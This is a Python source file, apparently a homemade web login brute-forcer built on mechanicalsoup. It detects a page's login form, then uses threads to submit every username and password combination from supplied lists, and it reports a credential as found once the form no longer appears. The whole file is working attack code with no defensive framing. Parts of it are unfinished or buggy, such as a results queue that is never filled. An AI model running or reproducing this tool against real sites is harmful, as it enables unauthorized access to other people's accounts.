import re, mechanicalsoup

def analysis(form):
   reTextControl = r"text\((.*)\)"
   rePasswdControl = r"password\((.*)\)"
   txtPasswdControl = re.findall(rePasswdControl, form)
      # Find password control. If has
      # 	1 password control -> login field
      # 	2 or more password control -> possibly register field
   if len(txtPasswdControl) == 1:
      txtTextControl = re.findall(reTextControl, form)
      # if len(txtTextControl) == 1:
            # Regular login field. > 1 can be register specific field (maybe captcha)
      return (txtTextControl[0], txtPasswdControl[0])
         # FOR WEB SHELL ONLY. REMOVE BUT CAN BE USED LATER IF NEEDED
         # elif len(txtTextControl) == 0:
         #    # Possibly password field login only
         #    return ([uint_formID, txtSubmitControl[0]], [txtPasswdControl[0]])
   return False

def getLoginForm(objBrowser):
   loginFields = False
   for fid, form in enumerate(objBrowser.forms()):
      try:
         loginFields = analysis(form)

         if loginFields:
            textField, passField = loginFields
            loginFields = (fid, textField, passField)
            return loginFields
      except Exception as error:
         if fid == 0:
            print("[x] Found no form")
         else:
            print("%s" %(error))
         break
      finally:
         return loginFields

def createBrowser():
   browser = mechanicalsoup.StatefulBrowser()
   # SETTINGS HERE
   return browser

def check(url):
   # Check if url has login form
   browser = createBrowser()
   try:
      browser.open(url)
      # OPENING URL, DEBUG MSG HERE
      result = getLoginForm(browser)
   except Exception as error:
      # PRINT ERROR HERE
      result = False
   finally:
      browser.close()
      return result

def start(url, userlist, passlist, threads = 16):
   def run_threads(threads):#, sending, completed, total):
      # Run threads
      for thread in threads:
         # sending += 1 # Sending
         # progress_bar(sending, completed, total)
         thread.start()

      # Wait for threads completed
      for thread in threads:
         # completed += 1
         # progress_bar(sending, completed, total)
         thread.join()

   def try_login(url, username, password, result):
      # CREATE NEW BROWSER FOR EACH LOGIN. THIS IS A MUST DO
      for cred in list(result.queue):
         if username == cred[1]:
            return True

      try:
         browser = createBrowser()
         browser.open(url)
         # FILL FORM WITH VALUES
         browser.select_form(nr = formID)
         browser[formUser] = username
         browser[formPass] = password
         # SUBMIT 
         browser.submit_selected()
         print("Trying: [%s:%s]" %(username, password))
         # check condition here
         # HAS FORM
         check_form = getLoginForm(browser)
         if not check_form:
            print("Found: [%s:%s]" %(username, password))
      # except mechanicalsoup.utils.LinkNotFoundError:
      #    # HAS NO FORM
      #    # OLD CODE STRUCT, TEST MORE
      #    print("Found: [%s:%s]" %(username, password))
      #    break
      except Exception as error:
         print(error)
         # PRINT ERROR
         pass
      # ADD MORE CONDITION HERE
      finally:
         browser.close()
   check_result = check(url)
   if not check_result:
      print("[x] Get login form error")
   else:
      formID, formUser, formPass = check_result
      import queue, threading
      result, pool = queue.Queue(), []


      for username in userlist:
         for password in passlist:
            if len(pool) == threads:
               run_threads(pool)
               del pool[:]
            worker = threading.Thread(
               target = try_login,
               args = (url, username, password, result)
            )
            worker.daemon = True
            pool.append(worker)


      run_threads(pool)
      del pool[:]

   print("[*] Completed")
